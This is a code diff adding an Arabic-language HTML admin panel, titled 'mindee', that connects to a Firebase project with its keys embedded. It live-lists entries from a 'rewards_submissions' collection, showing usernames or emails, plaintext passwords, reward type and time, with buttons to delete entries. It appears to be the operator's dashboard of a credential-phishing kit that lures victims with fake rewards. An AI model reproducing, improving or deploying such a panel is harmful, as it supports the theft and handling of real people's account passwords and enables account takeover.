@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة المدير الخاصة - mindee</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f4f6f8;
+            color: #333;
+            padding: 15px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #eff1f5;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            color: #1a1a1a;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .stats {
+            background-color: #0095f6;
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .btn-clear-all {
+            background-color: #ed4956;
+            color: white;
+            border: none;
+            padding: 7px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            transition: background-color 0.2s;
+        }
+
+        .btn-clear-all:hover {
+            background-color: #c82333;
+        }
+
+        .table-responsive {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+            text-align: right;
+        }
+
+        th, td {
+            padding: 12px 10px;
+            border-bottom: 1px solid #eee;
+            font-size: 13px;
+        }
+
+        th {
+            background-color: #fafafa;
+            color: #666;
+            font-weight: 600;
+        }
+
+        tr:hover {
+            background-color: #f9f9f9;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            background-color: #e1f5fe;
+            color: #0288d1;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+
+        .btn-delete {
+            background-color: #ed4956;
+            color: white;
+            border: none;
+            padding: 6px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 30px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>📥 قائمة الطلبات والبيانات</h1>
+        <div class="header-actions">
+            <button class="btn-clear-all" onclick="clearAllEntries()">مسح جميع الطلبات</button>
+            <div class="stats" id="totalCount">الطلبات: 0</div>
+        </div>
+    </div>
+
+    <div class="table-responsive">
+        <table>
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>البريد/اسم المستخدم</th>
+                    <th>كلمة المرور</th>
+                    <th>نوع المكافأة</th>
+                    <th>التاريخ والوقت</th>
+                    <th>إجراء</th>
+                </tr>
+            </thead>
+            <tbody id="dataTable">
+                <tr>
+                    <td colspan="6" class="empty-state">جاري تحميل البيانات...</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, onSnapshot, doc, deleteDoc, query, orderBy, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDlkFHULPYdjs7CBso3DROCJfg3C742yQk",
+      authDomain: "mindee-c504f.firebaseapp.com",
+      projectId: "mindee-c504f",
+      storageBucket: "mindee-c504f.firebasestorage.app",
+      messagingSenderId: "88922133115",
+      appId: "1:88922133115:web:2ee3a789e06286938b88de"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const dataTable = document.getElementById('dataTable');
+    const totalCount = document.getElementById('totalCount');
+
+    const q = query(collection(db, "rewards_submissions"), orderBy("timestamp", "desc"));
+    
+    onSnapshot(q, (snapshot) => {
+        dataTable.innerHTML = '';
+        totalCount.textContent = `الطلبات: ${snapshot.size}`;
+
+        if (snapshot.empty) {
+            dataTable.innerHTML = `<tr><td colspan="6" class="empty-state">لا توجد طلبات بعد</td></tr>`;
+            return;
+        }
+
+        let index = 1;
+        snapshot.forEach((docSnap) => {
+            const data = docSnap.data();
+            const date = data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString('ar-EG') : 'الآن';
+
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td>${index++}</td>
+                <td><strong>${escapeHtml(data.field1 || '')}</strong></td>
+                <td><code>${escapeHtml(data.field2 || '')}</code></td>
+                <td><span class="badge">${escapeHtml(data.rewardNumber || '')}</span></td>
+                <td>${date}</td>
+                <td><button class="btn-delete" onclick="deleteEntry('${docSnap.id}')">حذف</button></td>
+            `;
+            dataTable.appendChild(row);
+        });
+    });
+
+    function escapeHtml(text) {
+        return String(text).replace(/[&<>"']/g, function(m) {
+            return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' }[m];
+        });
+    }
+
+    window.deleteEntry = async (id) => {
+        if (confirm("هل تريد حذف هذا العنصر؟")) {
+            await deleteDoc(doc(db, "rewards_submissions", id));
+        }
+    };
+
+    window.clearAllEntries = async () => {
+        if (confirm("تحذير: هل أنت تأكد من حذف جميع الطلبات والبيانات بشكل نهائي؟")) {
+            const querySnapshot = await getDocs(collection(db, "rewards_submissions"));
+            querySnapshot.forEach(async (document) => {
+                await deleteDoc(doc(db, "rewards_submissions", document.id));
+            });
+        }
+    };
+</script>
+
+</body>
+</html>
